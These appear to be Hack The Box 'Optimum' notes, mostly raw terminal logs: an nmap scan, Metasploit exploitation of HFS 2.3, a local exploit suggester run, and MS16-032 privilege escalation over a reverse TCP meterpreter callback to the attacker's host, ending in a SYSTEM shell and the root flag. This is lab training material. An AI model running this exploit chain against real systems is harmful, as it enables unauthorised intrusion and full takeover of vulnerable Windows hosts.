nmap
```
┌──(kali㉿kali)-[~/HTB/optimum]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.248.208
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 04:54 EST
Nmap scan report for 10.129.248.208
Host is up (0.082s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   81.45 ms 10.10.14.1
2   81.87 ms 10.129.248.208

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.01 seconds
```

![Pasted image 20241219180943](<0. Attachments/Pasted image 20241219180943.png>)

![Pasted image 20241219182427](<0. Attachments/Pasted image 20241219182427.png>)

![Pasted image 20241219182445](<0. Attachments/Pasted image 20241219182445.png>)

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.3:4444 -> 10.129.248.208:49200 (10.129.248.208)

msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.248.208 - Collecting local exploits for x86/windows...
[*] 10.129.248.208 - 196 exploit checks are being tried...
[+] 10.129.248.208 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.248.208 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.248.208 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.129.248.208 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.248.208 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.129.248.208 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!                                                                    
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                                                                                  
 5   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 7   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 8   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 9   exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system                                                                                                            
 10  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 11  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 12  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 13  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found                                                                                                                 
 14  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 15  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found                                                                                                                       
 17  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 18  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 19  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 20  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 21  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 22  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 23  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable                                                                                            
 24  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 25  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 26  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 27  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 28  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 29  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 30  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 31  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 33  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 34  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 35  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 36  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found                                                                                                                       
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use 4
[-] Invalid module index: 4
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.153.140  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost tun0
lhost => 10.10.14.3
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > session 1
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > session -i
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.3:4444 -> 10.129.248.208:49200 (10.129.248.208)

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 1111
lport => 1111
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.3:1111 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\XVeclLVGQv.ps1...
[*] Compressing script contents...
[+] Compressed size: 3735
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2324

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $gv_ = [Ntdll]::NtImpersonateThread($lTBr, $lTBr, [ref]$dtz2)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (dtz2:VariablePath) [], Runtim 
   eException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $gv_ = [Advapi32]::DuplicateToken($hU, 2, [ref]$n19n)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

QhPaFAhJxZjgBPgNNLLrtLvWK4rEEU1F
[+] Executed on target machine.
[*] Sending stage (176198 bytes) to 10.129.248.208
[*] Meterpreter session 2 opened (10.10.14.3:1111 -> 10.129.248.208:49202) at 2024-12-19 06:22:16 -0500
[+] Deleted C:\Users\kostas\AppData\Local\Temp\XVeclLVGQv.ps1

meterpreter > shell
Process 1440 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>cd c:\users\administrator
cd c:\users\administrator

c:\Users\Administrator>cd desktop
cd desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of c:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
25/12/2024  08:50 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5.595.389.952 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
6081c6a9eefeb712cc84248a65f2deb7
```

![Pasted image 20241219192434](<0. Attachments/Pasted image 20241219192434.png>)

![Pasted image 20241219192504](<0. Attachments/Pasted image 20241219192504.png>)

![Pasted image 20241219192521](<0. Attachments/Pasted image 20241219192521.png>)

